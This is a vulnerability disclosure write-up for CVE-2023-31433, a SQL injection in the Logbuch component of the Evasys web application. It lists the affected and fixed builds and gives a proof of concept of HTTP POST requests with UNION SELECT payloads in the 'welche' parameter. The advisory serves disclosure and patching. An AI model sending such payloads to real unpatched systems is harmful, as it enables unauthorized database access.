# [SQL-Injection in Evasys Logbuch - CVE-2023-31433](https://trustcves.github.io/posts/cve-2023-31433/writeup/)

**Affected Product:** Evasys

**Affected Versions:** evasys v8.2 Build 2275 - 2285 and evasys v9.0 Build 2400 (both according to vendor)

**Fixed Version:** v8.2 Build 2286 and v9.0 Build 2401

**CVE-Number:** CVE-2023-31433

**Severity:** 9.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:L)

*Discovered by Dipl-Ing. Mario Rubak, BSc MSc and Regina Kohl, BSc*

During a penetration test conducted for a client, the testers discovered that the web application “evasys” enables users to inject SQL code into the “welche” parameter. The vulnerability resides in the “Logbuch” component, which can only be accessed by authenticated users.

## Proof of Concept

In this case, we have identified three distinct techniques for exploiting the SQL injection vulnerability: boolean-based blind, stacked queries, and UNION queries. We demonstrate the feasibility of the exploit using a UNION query injection. Specifically, we were able to perform a UNION injection with 9 columns. To achieve this, we concatenated NULL 9 times in the proof-of-concept (PoC) request, once for each column. When this request is sent, the web application returns a positive HTTP 200 status message, and an empty row is displayed.

```
POST /project/SearchProject/ HTTP/1.1
<Header shortend>

welche=welche=0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- LDqO&maxrow=15&posi=0

--> HTTP/1.1 200 OK

```

However, if you concatenate only 8 or fewer NULL expressions, or 10 or more NULL expressions, the web server returns error code 500:

```
POST /project/SearchProject/ HTTP/1.1
<Header shortend>

welche=welche=0) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL -- LDqO&maxrow=15&posi=0

--> HTTP/1.1 500 Internal Server Error

```

This makes it possible to inject specific SQL statements instead of a NULL expression, and thus, execute queries that are displayed in the web application.
